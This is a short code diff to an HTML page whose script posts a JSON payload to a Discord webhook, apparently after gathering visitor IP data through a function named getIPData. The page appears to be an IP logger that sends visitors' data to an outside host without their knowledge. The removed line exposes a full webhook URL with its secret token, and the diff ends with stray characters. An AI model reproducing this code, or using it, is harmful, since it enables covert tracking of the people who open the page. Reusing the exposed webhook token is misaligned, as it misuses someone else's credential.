@@ -37,7 +37,7 @@
     </div>
 
     <script>
-        const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
+        const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_HERE';
 
         async function getIPData() {
             try {
@@ -112,7 +112,7 @@
                 }]
             };
 
-         fetch(WEBHOOK_URL, {
+            await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)Aa
